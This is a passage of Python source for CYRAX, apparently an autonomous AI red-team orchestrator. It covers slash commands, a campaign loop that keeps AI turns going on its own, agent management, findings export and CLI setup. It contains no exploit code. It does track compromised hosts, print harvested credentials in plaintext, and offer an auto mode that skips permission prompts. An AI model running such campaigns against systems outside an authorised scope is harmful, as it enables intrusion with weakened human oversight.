            summary = report.get("summary", "No summary")
            findings = report.get("findings", [])
            finding_text = ""
            if findings:
                finding_lines = []
                for f in findings[:10]:
                    if isinstance(f, dict):
                        finding_lines.append(
                            f"  - [{f.get('severity', '?')}] {f.get('title', 'untitled')}"
                        )
                finding_text = "\nFindings:\n" + "\n".join(finding_lines)
            feedback.append(
                f"[Agent {agent_id} Completed]\n"
                f"Status: {status}\n"
                f"Summary: {summary}{finding_text}"
            )
        return feedback

    def request_pause(self):
        """Request a pause in the current operation (called from TUI)."""
        self._pause_requested = True

    def request_hard_interrupt(self):
        """Immediately interrupt current execution and stop background activity."""
        self._pause_requested = True
        self._hard_interrupt_requested = True
        try:
            self.permission_gate.set_interrupt()
        except Exception:
            pass
        try:
            self.tools.executor.interrupt_current()
        except Exception:
            pass
        try:
            self.agent_pool.kill_all(graceful=False)
        except Exception:
            pass

    def queue_user_message(self, message: str):
        """Queue a message to send on the next turn (replaces auto-continue)."""
        self._queued_user_message = message

    def handle_command(self, user_input: str) -> Optional[str]:
        """Handle special user commands (prefixed with /)."""
        cmd = user_input.strip().lower()
        parts = user_input.strip().split(maxsplit=1)
        cmd_name = parts[0].lower() if parts else ""
        cmd_args = parts[1] if len(parts) > 1 else ""

        if cmd in ("/exit", "/quit", "/q", "/bye"):
            return "EXIT"

        if cmd == "/pause":
            if self._campaign_mode:
                self.campaign.status = "paused"
                self._mark_agents_orphaned_if_active()
                self._save_campaign_state()
                display.show_success(
                    f"Campaign '{self._campaign_name}' paused and saved to {self._campaign_dir}/"
                )
                return "EXIT"
            else:
                display.show_info("Not in campaign mode. Use /exit to quit.")
                return ""

        if cmd == "/status":
            state = self.campaign.to_dict()
            state.update({
                "model": f"{self.model.provider}/{self.model.model_name}",
                "permission_mode": self._current_mode_label(),
                "scope": self._session_scope_label(),
                "streaming": "on",
                "queued_message": "yes" if self._queued_user_message else "no",
            })
            display.show_campaign_status(state)
            return ""

        if cmd == "/config":
            work_dir = getattr(self.tools.executor, "work_dir", "")
            display.show_campaign_status({
                "provider": self.model.provider,
                "model": self.model.model_name,
                "temperature": self.model.temperature,
                "max_tokens": self.model.max_tokens,
                "work_dir": work_dir,
                "scope": self._session_scope_label(),
                "permission_mode": self._current_mode_label(),
            })
            return ""

        if cmd_name == "/model":
            if cmd_args:
                self.model.model_name = cmd_args.strip()
                try:
                    self.model.client.model = self.model.model_name
                except Exception:
                    pass
                display.show_success(f"Model switched to {self.model.model_name}")
            else:
                display.show_info(f"Current model: {self.model.provider}/{self.model.model_name}")
            return ""

        if cmd_name == "/mode":
            mode = cmd_args.strip().lower()
            if not mode:
                display.show_info(f"Current permission mode: {self._current_mode_label()}")
            elif mode == "auto":
                self.permission_gate.auto_approve_all()
                self._plan_mode = False
                display.show_success("Permission mode set to auto.")
            elif mode in ("interactive", "default", "ask"):
                self.permission_gate.auto_approve = False
                self._plan_mode = False
                display.show_success("Permission mode set to interactive.")
            elif mode == "plan":
                self._plan_mode = True
                display.show_success("Permission mode set to plan. CYRAX will present plans before acting.")
            elif mode == "ci":
                self.permission_gate.auto_approve = False
                display.show_info("CI mode is selected automatically when stdin is non-interactive.")
            else:
                display.show_info("Usage: /mode [auto|interactive|plan|ci]")
            return ""

        if cmd == "/agents":
            pool_status = self.agent_pool.get_status()
            if pool_status:
                for aid, info in pool_status.items():
                    display.show_info(
                        f"{aid} (PID {info['pid']}): {info['status']} - "
                        f"iter {info['iteration']} - {info['task']}"
                    )
            else:
                display.show_info("No agents spawned yet.")
            return ""

        if cmd_name == "/kill":
            if cmd_args:
                target_id = cmd_args.strip().upper()
                killed = self.agent_pool.kill(target_id, graceful=True, timeout=10.0)
                if killed:
                    display.show_success(f"Agent {target_id} killed.")
                else:
                    display.show_error(f"Agent {target_id} not found or already terminated.")
            else:
                display.show_info("Usage: /kill <agent_id>")
            return ""

        if cmd == "/killall":
            running = self.agent_pool.get_running()
            if running:
                self.agent_pool.kill_all(graceful=True)
                display.show_success(f"Killed {len(running)} agent(s).")
            else:
                display.show_info("No agents currently running.")
            return ""

        if cmd == "/dashboard":
            if self.agent_pool._tmux_enabled:
                display.show_info(
                    f"Tmux dashboard: tmux attach -t cyrax-{self._session_id}"
                )
            else:
                display.show_info(
                    "Tmux not available. Agent status:\n"
                )
                pool_status = self.agent_pool.get_status()
                for aid, info in pool_status.items():
                    display.show_info(
                        f"  {aid}: {info['status']} (PID {info['pid']}) "
                        f"iter {info['iteration']}"
                    )
            return ""

        if cmd == "/findings":
            findings = self.knowledge.get_findings()
            if findings:
                for f in findings:
                    display.show_finding(
                        f["severity"], f["title"], f["description"]
                    )
            else:
                display.show_info("No findings recorded yet.")
            return ""

        if cmd == "/credentials" or cmd == "/creds":
            creds = self.knowledge.get_credentials()
            if creds:
                for c in creds:
                    display.show_info(
                        f"{c['username']}:{c.get('password', '***')} "
                        f"@ {c.get('target', 'N/A')} "
                        f"(source: {c.get('source', 'N/A')})"
                    )
            else:
                display.show_info("No credentials found yet.")
            return ""

        if cmd == "/hosts":
            hosts = self.knowledge.get_hosts()
            if hosts:
                for h in hosts:
                    display.show_info(
                        f"{h['hostname']} ({h.get('ip', '?')}) "
                        f"ports: {h.get('ports', [])}"
                    )
            else:
                display.show_info("No hosts discovered yet.")
            return ""

        if cmd == "/usage":
            usage = self.model.get_usage()
            display.show_info(
                f"Model: {usage['provider']}/{usage['model']}\n"
                f"Tokens in: {usage['total_tokens_in']}\n"
                f"Tokens out: {usage['total_tokens_out']}\n"
                f"Total: {usage['total_tokens']}"
            )
            return ""

        if cmd_name == "/scope":
            if cmd_args:
                new_target = cmd_args.strip()
                self.scope.reset()
                self._configure_scope(new_target)
                self.campaign.target = new_target
                display.show_success(f"Scope switched to: {self.scope.get_scope_description()}")
            else:
                display.show_info(f"Current scope: {self.scope.get_scope_description()}")
            return ""

        if cmd_name == "/approve":
            if cmd_args:
                self.permission_gate.approve_category(cmd_args)
                display.show_success(f"Pre-approved action category: {cmd_args}")
            else:
                cats = ", ".join(PermissionGate.ACTIONS.keys())
                display.show_info(f"Usage: /approve <category>\nCategories: {cats}")
            return ""

        if cmd == "/auto":
            self.permission_gate.auto_approve_all()
            display.show_success("Permission mode set to auto. CYRAX will not prompt for actions.")
            return ""

        if cmd_name == "/add-dir":
            if cmd_args:
                new_path = cmd_args.strip()
                self.scope.add_targets([new_path])
                self.tools.executor.scope_enforcer = self.scope
                display.show_success(f"Added to workspace: {new_path}")
                display.show_info(f"Scope: {self.scope.get_scope_description()}")
            else:
                display.show_info("Usage: /add-dir <path>")
            return ""

        if cmd == "/plan":
            display.show_info(
                "Plan mode enabled. CYRAX will analyze and present a plan before "
                "executing any actions. Send your request now."
            )
            self._plan_mode = True
            return ""

        if cmd_name == "/compact":
            keep = 12
            if cmd_args:
                try:
                    keep = max(1, int(cmd_args.strip()))
                except ValueError:
                    display.show_info("Usage: /compact [messages_to_keep]")
                    return ""
            removed = self.conversation.compact(keep_recent=keep)
            display.show_compact_summary(removed, len(self.conversation.messages))
            return ""

        if cmd == "/clear":
            self.conversation.clear()
            display.show_success("Conversation context cleared.")
            return ""

        if cmd == "/export":
            self._export_findings()
            return ""

        if cmd == "/help":
            display.show_help(self._slash_commands())
            return ""

        return None

    def _export_findings(self):
        """Export findings to a markdown and JSON report file.

        DEF-M08-2: Include the evidence field in exported reports.
        DEF-M08-3: Also write cyrax_report.json for CI/XBOW integration.
        """
        import json as _json
        findings = self.knowledge.get_findings()
        if not findings:
            display.show_info("No findings to export.")
            return

        report_path = self.tools.executor.work_dir / "cyrax_report.md"
        json_path = self.tools.executor.work_dir / "cyrax_report.json"

        # ── Markdown export ──────────────────────────────────────────────────
        lines = [
            "# CYRAX Security Assessment Report",
            "",
            f"**Target:** {self.campaign.target or 'N/A'}",
            f"**Campaign:** {self._campaign_name or 'N/A'}",
            f"**Findings:** {len(findings)}",
            "",
            "---",
            "",
        ]
        for i, f in enumerate(findings, 1):
            evidence_text = f.get("evidence", "") or ""
            lines.extend([
                f"## {i}. [{f['severity'].upper()}] {f['title']}",
                "",
                f"- ID: {f.get('id', 'N/A')}",
                f"- Timestamp: {f.get('stored_at', 'N/A')}",
                f"- Agent: {f.get('agent_id', 'N/A') or 'N/A'}",
                f"- Target: {f.get('target_url_host', f.get('target', 'N/A')) or 'N/A'}",
                f"- Command/Action ID: {f.get('command_action_id', 'N/A') or 'N/A'}",
                f"- Output Ref: {f.get('raw_output_ref', 'N/A') or 'N/A'}",
                "",
                f['description'],
            ])
            if evidence_text:
                lines.extend([
                    "",
                    "**Evidence:**",
                    "```",
                    evidence_text,
                    "```",
                ])
            lines.extend(["", "---", ""])

        report_path.write_text("\n".join(lines), encoding="utf-8")

        # ── JSON export (DEF-M08-3) ──────────────────────────────────────────
        json_report = {
            "target": self.campaign.target or "",
            "campaign": self._campaign_name or "",
            "generated_at": datetime.now(timezone.utc).isoformat(),
            "finding_count": len(findings),
            "findings": findings,
        }
        json_path.write_text(
            _json.dumps(json_report, indent=2, default=str),
            encoding="utf-8",
        )

        display.show_success(f"Report exported: {report_path} and {json_path}")

    def _threaded_chat(self, user_input: str):
        """Run chat in a thread. Stores result/error for the main thread."""
        try:
            self._chat_result = self.chat(user_input)
        except Exception as e:
            self._chat_error = e

    def run(self):
        """
        Main interactive loop with threaded AI execution.
        The AI runs in a background thread so the user can Ctrl+C to interrupt.
        """
        display.show_banner()
        display.show_session_intro(
            provider=self.model.provider,
            model=self.model.model_name,
            scope=self._session_scope_label(),
            permission_mode=self._current_mode_label(),
            streaming=True,
        )

        if self._campaign_mode:
            display.show_cyrax_message(
                f"Campaign '{self._campaign_name}' active. "
                f"Objective: {self.campaign.objective or 'Not set'}\n"
                f"Use /pause to save and exit."
            )
        else:
            display.show_cyrax_message("Ready.")

        turn_count = 0
        while True:
            # In campaign mode after the first turn, auto-continue
            if (
                self._campaign_mode
                and turn_count > 0
                and self.campaign.status == "active"
            ):
                # Stall detection: 3 consecutive turns with zero actions
                if self._consecutive_empty_turns >= 3:
                    display.show_warning(
                        "3 consecutive turns with no commands executed. "
                        "The AI may need guidance. Type a message to redirect, or /pause to stop."
                    )
                    user_input = display.prompt_user()
                    if not user_input or user_input.strip().lower() in ("exit", "/exit"):
                        self.campaign.status = "paused"
                        self._mark_agents_orphaned_if_active()
                        self._save_campaign_state()
                        break
                    self._consecutive_empty_turns = 0
                else:
                    if self._queued_user_message:
                        user_input = self._queued_user_message
                        self._queued_user_message = None
                    else:
                        user_input = "Continue."
                    display.show_info(f"[Turn {turn_count + 1}]")

                    if turn_count % 5 == 0 and turn_count > 0:
                        findings = self.knowledge.get_findings()
                        display.show_info(
                            f"Findings: {len(findings)} | "
                            f"Hosts: {len(self.campaign.compromised_hosts)} | "
                            f"Agents: {len(self.agents)}"
                        )
            else:
                user_input = display.prompt_user()

            if not user_input or not user_input.strip():
                continue

            # Handle slash commands and exit aliases
            stripped = user_input.strip()
            if stripped.lower() in ("/bye", "/quit", "/q"):
                stripped = "/exit"
            if stripped.startswith("/"):
                result = self.handle_command(stripped)
                if result == "EXIT":
                    if self._campaign_mode:
                        self._mark_agents_orphaned_if_active()
                        self._save_campaign_state()
                        display.show_cyrax_message("Campaign state saved. Ending session.")
                    else:
                        display.show_cyrax_message("Ending session. Stay sharp.")
                    break
                if result is not None:
                    continue

            # Run AI in background thread so Ctrl+C interrupts cleanly
            self._pause_requested = False
            self._hard_interrupt_requested = False
            try:
                self.permission_gate.clear_interrupt()
            except Exception:
                pass
            self._chat_result = None
            self._chat_error = None
            ai_thread = threading.Thread(
                target=self._threaded_chat, args=(user_input,), daemon=True
            )
            ai_thread.start()

            try:
                while ai_thread.is_alive():
                    ai_thread.join(timeout=0.3)
            except KeyboardInterrupt:
                self.request_hard_interrupt()
                display.show_warning(
                    "\nInterrupt requested. Stopping immediately... "
                    "(Ctrl+C again to force quit)"
                )
                try:
                    ai_thread.join(timeout=3)
                except KeyboardInterrupt:
                    if self._campaign_mode:
                        self._mark_agents_orphaned_if_active()
                        self._save_campaign_state()
                        display.show_cyrax_message("Campaign state saved. Ending session.")
                    else:
                        display.show_cyrax_message("Force quit. Ending session.")
                    break
                if ai_thread.is_alive():
                    if self._campaign_mode:
                        self._mark_agents_orphaned_if_active()
                        self._save_campaign_state()
                        display.show_cyrax_message("Campaign state saved. Ending session.")
                    else:
                        display.show_cyrax_message("Force quit. Ending session.")
                    break

            if self._chat_error:
                display.show_error(f"AI error: {self._chat_error}")

            turn_count += 1
            display.show_turn_summary(
                self._actions_executed_this_turn,
                self._cmds_succeeded_this_turn,
                self.model.get_usage(),
                self.agent_pool.active_count(),
            )

            # Track actions for auto-continue (cap to last 50 to prevent unbounded growth)
            self._turn_action_counts.append(self._actions_executed_this_turn)
            if len(self._turn_action_counts) > 50:
                self._turn_action_counts = self._turn_action_counts[-50:]
            if self._actions_executed_this_turn == 0:
                self._consecutive_empty_turns += 1
            else:
                self._consecutive_empty_turns = 0

            # Poll for completed agent reports and queue them for the next turn
            agent_feedback = self._poll_completed_agents()
            if agent_feedback:
                combined_feedback = "\n\n".join(agent_feedback)
                self.conversation.add_message(
                    "user", f"[Agent Reports]\n{combined_feedback}"
                )

            if self._campaign_mode:
                self._save_campaign_state()

    def shutdown(self):
        """Clean up resources: agents, browser, DB, logs."""
        try:
            running = self.agent_pool.get_running()
            if running:
                self.campaign.mark_agents_orphaned()
                if self._campaign_mode:
                    self._save_campaign_state()
            self.agent_pool.shutdown(wait=bool(running))
        except KeyboardInterrupt:
            # Best-effort shutdown: avoid traceback on second Ctrl+C
            try:
                self.agent_pool.shutdown(wait=False)
            except Exception:
                pass
        except Exception:
            pass
        if self.browser:
            self.browser.close()
        self.knowledge.close()
        self.logger.close()


def load_config(config_path: Optional[str] = None) -> dict:
    """Load configuration from YAML file."""
    defaults = _default_config()
    if config_path:
        path = Path(config_path).expanduser()
    else:
        candidates = [
            Path("config/config.yaml"),
            Path("config.yaml"),
            Path.home() / ".cyrax" / "config.yaml",
        ]
        path = None
        for candidate in candidates:
            if candidate.exists():
                path = candidate
                break

    if path and path.exists():
        with open(path, encoding="utf-8") as f:
            loaded = yaml.safe_load(f) or {}
        if not isinstance(loaded, dict):
            raise ValueError(f"Config file {path} must contain a YAML mapping")
        return _apply_env_model_defaults(_deep_merge_config(defaults, loaded))

    return _apply_env_model_defaults(defaults)


def save_config(config: dict, config_path: Optional[str] = None) -> Path:
    """Save configuration to a YAML file and return the written path."""
    path = Path(config_path).expanduser() if config_path else Path("config/config.yaml")
    path.parent.mkdir(parents=True, exist_ok=True)
    with open(path, "w", encoding="utf-8") as f:
        yaml.safe_dump(config, f, default_flow_style=False, sort_keys=False)
    return path


def setup_interactive(config: dict) -> dict:
    """Interactive setup for first-time users."""
    from rich.prompt import Prompt, Confirm

    console = display.console

    console.print("\n[bold yellow]CYRAX First-Time Setup[/bold yellow]\n")

    provider = Prompt.ask(
        "Select model provider",
        choices=_MODEL_PROVIDERS,
        default="anthropic",
    )
    config["model"]["provider"] = provider

    if provider in _API_MODEL_PROVIDERS:
        env_var = _PROVIDER_ENV_VARS[provider]
        env_key = os.environ.get(env_var, "")
        if env_key:
            console.print(f"[green]Found API key in environment ({env_var})[/green]")
            config["model"]["api_key"] = env_key
        else:
            api_key = Prompt.ask(f"Enter {provider} API key")
            config["model"]["api_key"] = api_key

        model_name = Prompt.ask(
            "Model name", default=_PROVIDER_DEFAULT_MODELS.get(provider, "")
        )
        config["model"]["model_name"] = model_name

    elif provider in _LOCAL_MODEL_PROVIDERS:
        default_urls = {
            "ollama": "http://localhost:11434",
            "lmstudio": "http://localhost:1234/v1",
            "vllm": "http://localhost:8000/v1",
        }
        api_url = Prompt.ask(
            "API URL", default=default_urls[provider]
        )
        config["model"]["api_url"] = api_url

        model_name = Prompt.ask(
            "Model name",
            default=_PROVIDER_DEFAULT_MODELS.get(provider, "local-model"),
        )
        config["model"]["model_name"] = model_name

    elif provider == "custom":
        api_url = Prompt.ask("Custom API endpoint URL")
        api_key = Prompt.ask("API key (leave blank if none)", default="")
        model_name = Prompt.ask("Model name")
        config["model"]["api_url"] = api_url
        config["model"]["api_key"] = api_key
        config["model"]["model_name"] = model_name

    if Confirm.ask("Save configuration to config/config.yaml?", default=True):
        config_path = save_config(config)
        console.print(f"[green]Config saved to {config_path}[/green]")

    return config


def configure_cli(args: argparse.Namespace) -> int:
    """Configure CYRAX non-interactively from CLI flags."""
    config = load_config(args.config)
    model = config.setdefault("model", {})

    if args.provider:
        model["provider"] = args.provider
    provider = model.get("provider", "anthropic")
    if provider not in _MODEL_PROVIDERS:
        display.show_error(f"Unsupported provider: {provider}")
        return 2

    if args.model:
        model["model_name"] = args.model
    else:
        model.setdefault("model_name", _PROVIDER_DEFAULT_MODELS.get(provider, ""))

    if args.api_url:
        model["api_url"] = args.api_url

    env_var = _PROVIDER_ENV_VARS.get(provider, "")
    if args.api_key_env:
        env_var = args.api_key_env
    if args.api_key:
        model["api_key"] = args.api_key
    elif env_var and os.environ.get(env_var):
        model["api_key"] = os.environ[env_var]

    if provider in _API_MODEL_PROVIDERS | {"custom"} and _is_missing_api_key(
        str(model.get("api_key", "") or "")
    ):
        hint = f" Set {env_var} or pass --api-key." if env_var else " Pass --api-key."
        display.show_error(f"Missing API key for provider '{provider}'.{hint}")
        return 2

    path = save_config(config, args.output or args.config)
    display.show_success(f"Configuration saved to {path}")
    return 0


def status_cli(args: argparse.Namespace) -> int:
    """Print current CYRAX configuration and runtime status."""
    config = load_config(args.config)
    model = config.get("model", {})
    provider = model.get("provider", "")
    api_key = str(model.get("api_key", "") or "")
    tools = ToolRegistry()
    available = [tool for tool in tools.list_tools() if tool["available"]]

    table = Table(
        title="CYRAX Status",
        box=box.ROUNDED,
        show_header=True,
        header_style="bold cyan",
    )
    table.add_column("Property", style="bold")
    table.add_column("Value")
    table.add_row("Provider", str(provider or "not configured"))
    table.add_row("Model", str(model.get("model_name", "") or "not configured"))
    table.add_row("API key", "configured" if not _is_missing_api_key(api_key) else "missing")
    table.add_row("Tools", f"{len(available)}/{len(tools.tools)} available")
    table.add_row("Work dir", str(config.get("tools", {}).get("work_dir", "")))
    table.add_row("Auto approve", str(config.get("safety", {}).get("auto_approve", False)))
    display.console.print(table)

    if args.show_config:
        display.console.print("\n[bold]Resolved config:[/bold]")
        display.console.print(yaml.safe_dump(_redact_config(config), sort_keys=False))
    return 0


def tools_cli(args: argparse.Namespace) -> int:
    """List registered tools and local availability."""
    registry = ToolRegistry()
    tools = registry.list_tools(category=args.category)
    if args.available:
        tools = [tool for tool in tools if tool["available"]]

    table = Table(
        title="CYRAX Tools",
        box=box.ROUNDED,
        show_header=True,
        header_style="bold cyan",
    )
    table.add_column("Name", style="bold")
    table.add_column("Category")
    table.add_column("Available")
    table.add_column("Description")
    for tool in tools:
        table.add_row(
            tool["name"],
            tool["category"],
            "yes" if tool["available"] else "no",
            tool["description"],
        )
    display.console.print(table)
    return 0


def preflight_cli(_args: argparse.Namespace) -> int:
    """Run environment checks from the primary CLI."""
    import platform
    import shutil
    import subprocess as _sp

    required_modules = [
        ("rich", "rich"),
        ("yaml", "pyyaml"),
        ("httpx", "httpx"),
    ]
    optional_modules = [
        ("openai", "openai"),
        ("anthropic", "anthropic"),
        ("google.generativeai", "google-generativeai"),
        ("playwright.sync_api", "playwright"),
        ("textual", "textual"),
        ("pytest", "pytest"),
    ]
    optional_tools = ["nmap", "sqlmap", "chromium", "chromium-browser"]

    def check_module(import_name: str, package_name: str, required: bool) -> tuple[bool, str]:
        try:
            result = _sp.run(
                [sys.executable, "-c", f"import {import_name}"],
                capture_output=True,
                timeout=10,
            )
        except _sp.TimeoutExpired:
            label = "REQUIRED" if required else "optional"
            return not required, f"import timed out ({label}): pip install {package_name}"
        if result.returncode == 0:
            return True, "installed"
        stderr = result.stderr.decode(errors="replace")
        label = "REQUIRED" if required else "optional"
        if "ModuleNotFoundError" in stderr or "ImportError" in stderr:
            return not required, f"NOT installed ({label}): pip install {package_name}"
        short = stderr.splitlines()[-1][:80] if stderr.strip() else "import failed"
        return not required, f"import error ({label}): {short}"

    results: list[tuple[str, bool, str]] = []
    print(f"=== CYRAX Preflight [{platform.system()} {platform.machine()}] ===\n")
    print("Required packages:")
    for import_name, package_name in required_modules:
        ok, message = check_module(import_name, package_name, required=True)
        results.append((package_name, ok, message))
        print(f"  [{'OK' if ok else 'FAIL'}] {package_name}: {message}")

    print("\nOptional packages:")
    for import_name, package_name in optional_modules:
        ok, message = check_module(import_name, package_name, required=False)
        results.append((package_name, ok, message))
        print(f"  [{'OK' if ok else 'miss'}] {package_name}: {message}")

    print("\nOptional system tools:")
    for tool in optional_tools:
        print(f"  [info] {tool}: {shutil.which(tool) or 'not found (optional)'}")

    failures = [result for result in results if not result[1]]
    print(f"\nPreflight summary: {len(results) - len(failures)}/{len(results)} checks OK")
    if failures:
        print("\nFailed checks:")
        for name, _ok, message in failures:
            print(f"  - {name}: {message}")
        print("\nPreflight FAILED — resolve the above before running CYRAX.")
        return 1

    print("\nPreflight PASSED — environment is ready.")
    return 0


def chat_cli(args: argparse.Namespace) -> int:
    """Start the CYRAX chat runtime."""
    config = load_config(args.config)

    api_key = str(config.get("model", {}).get("api_key", "") or "")
    provider = config.get("model", {}).get("provider", "")
    needs_setup = (
        args.setup
        or (
            provider in _API_MODEL_PROVIDERS
            and _is_missing_api_key(api_key)
            and sys.stdin.isatty()
        )
    )

    if needs_setup:
        config = setup_interactive(config)

    api_key = str(config.get("model", {}).get("api_key", "") or "")
    provider = config.get("model", {}).get("provider", "")
    if provider in _API_MODEL_PROVIDERS and _is_missing_api_key(api_key):
        env_var = _PROVIDER_ENV_VARS.get(provider, "")
        fallback = "XAI_API_KEY" if provider == "xai" else ""
        hint = f"Set {env_var}" if env_var else "configure an API key"
        if fallback:
            hint += f" or {fallback}"
        display.show_error(f"Missing API key for provider '{provider}'. {hint}, or run `cyrax init`.")
        return 2

    if not config.get("model", {}).get("provider"):
        display.show_error(
            "No model provider configured. Run `cyrax init` or create config/config.yaml"
        )
        return 1

    if args.auto:
        config.setdefault("safety", {})["auto_approve"] = True

    cyrax = CyraxOrchestrator(config)

    permission_mode = getattr(args, "permission_mode", "") or ""
    if permission_mode == "auto":
        cyrax.permission_gate.auto_approve_all()
    elif permission_mode == "plan":
        cyrax._plan_mode = True

    if args.scope:
        cyrax._configure_scope(args.scope)
        cyrax.campaign.target = args.scope

    for add_dir in getattr(args, "add_dir", []) or []:
        cyrax.scope.add_targets([add_dir])
        cyrax.tools.executor.scope_enforcer = cyrax.scope

    if args.campaign:
        cyrax.start_campaign(args.campaign, objective=args.objective)

    prompt = getattr(args, "prompt", "") or getattr(args, "root_prompt", "")
    if prompt:
        try:
            response = cyrax.chat(prompt)
            if args.print_response:
                print(response)
        finally:
            cyrax.shutdown()
        return 0

    try:
        if args.tui and sys.stdin.isatty():
            try:
                from ui.app import CyraxApp
                app = CyraxApp(cyrax)
                app.run()
            except Exception as exc:
                display.show_warning(
                    f"TUI unavailable ({exc}). Falling back to the premium terminal operator."
                )
                cyrax.run()
        else:
            cyrax.run()
    except KeyboardInterrupt:
        if cyrax._campaign_mode:
            cyrax._mark_agents_orphaned_if_active()
            cyrax._save_campaign_state()
            display.show_cyrax_message("\nInterrupted. Campaign state saved.")
        else:
            display.show_cyrax_message("\nInterrupted. Ending session.")
    finally:
        cyrax.shutdown()
    return 0


def create_parser() -> argparse.ArgumentParser:
    """Create the CYRAX command parser."""
    parser = argparse.ArgumentParser(
        description="CYRAX - Autonomous AI Red Team Operator"
    )
    parser.add_argument(
        "--config", "-c",
        type=str,
        help="Path to configuration file",
    )
    parser.add_argument(
        "--cwd",
        type=str,
        help="Working directory for this command",
    )
    parser.add_argument(
        "--version",
        action="version",
        version="cyrax 1.0.0",
    )
    subparsers = parser.add_subparsers(dest="command")

    init_parser = subparsers.add_parser(
        "init",
        help="run first-time interactive setup",
        description="Initialize CYRAX configuration and provider settings",
    )
    init_parser.set_defaults(handler=lambda args: configure_init_cli(args))

    configure_parser = subparsers.add_parser(
        "configure",
        aliases=["config"],
        help="write provider settings non-interactively",
        description="Configure model provider settings without prompts",
    )
    configure_parser.add_argument(
        "--provider",
        choices=_MODEL_PROVIDERS,
        help="Model provider",
    )
    configure_parser.add_argument("--model", help="Model name")
    configure_parser.add_argument("--api-key", help="API key for the provider")
    configure_parser.add_argument(
        "--api-key-env",
        help="Environment variable to read the API key from",
    )
    configure_parser.add_argument("--api-url", help="Provider API URL")
    configure_parser.add_argument(
        "--output",
        help="Config file to write (defaults to --config or config/config.yaml)",
    )
    configure_parser.set_defaults(handler=configure_cli)

    chat_parser = subparsers.add_parser(
        "chat",
        help="start the interactive operator session",
        description="Start a CYRAX conversation",
    )
    _add_chat_arguments(chat_parser)
    chat_parser.set_defaults(handler=chat_cli)

    status_parser = subparsers.add_parser("status", help="show resolved runtime status")
    status_parser.add_argument(
        "--show-config",
        action="store_true",
        help="Print redacted resolved configuration",
    )
    status_parser.set_defaults(handler=status_cli)

    tools_parser = subparsers.add_parser("tools", help="list registered tools")
    tools_parser.add_argument("--category", help="Filter by category")
    tools_parser.add_argument(
        "--available",
        action="store_true",
        help="Only show tools installed on this system",
    )
    tools_parser.set_defaults(handler=tools_cli)

    preflight_parser = subparsers.add_parser(
        "preflight",
        help="check interpreter, packages, and local toolchain",
    )
    preflight_parser.set_defaults(handler=preflight_cli)

    _add_chat_arguments(parser, prompt_dest="root_prompt")
    parser.set_defaults(handler=chat_cli)
    return parser


def _add_chat_arguments(parser: argparse.ArgumentParser, prompt_dest: str = "prompt") -> None:
    """Add shared chat runtime flags to a parser."""
    parser.add_argument(
        prompt_dest,
        nargs="?",
        default="",
        help="Run one prompt non-interactively, then exit",
    )
    parser.add_argument(
        "--setup",
        action="store_true",
        help="Run interactive setup before chat",
    )
    parser.add_argument(
        "--campaign",
        type=str,
        metavar="NAME",
        help="Start or resume a named campaign",
    )
    parser.add_argument(
        "--objective",
        type=str,
        default="",
        help="Campaign objective (used with --campaign for new campaigns)",
    )
    parser.add_argument(
        "--auto",
        action="store_true",
        help="Fully autonomous mode — no permission prompts",
    )
    parser.add_argument(
        "--scope",
        type=str,
        default="",
        help="Comma-separated list of in-scope targets (IPs, domains, CIDRs)",
    )
    parser.add_argument(
        "--add-dir",
        action="append",
        default=[],
        help="Add a local directory to the active workspace scope",
    )
    parser.add_argument(
        "--permission-mode",
        choices=("interactive", "auto", "plan"),
        default="",
        help="Start in a Claude Code-style permission mode",
    )
    parser.add_argument(
        "--tui",
        action="store_true",
        help="Launch with the Textual interactive TUI (experimental)",
    )
    parser.add_argument(
        "--simple",
        action="store_true",
        help="Force simple Rich console mode (no Textual TUI)",
    )
    parser.add_argument(
        "--print",
        dest="print_response",
        action="store_true",
        help="Print the full final response after a one-shot prompt",
    )


def configure_init_cli(args: argparse.Namespace) -> int:
    """Run the interactive initializer as a subcommand."""
    config = load_config(args.config)
    setup_interactive(config)
    return 0


def main():
    parser = create_parser()
    args = parser.parse_args()
    with _working_directory(args.cwd):
        sys.exit(args.handler(args))


if __name__ == "__main__":
    main()
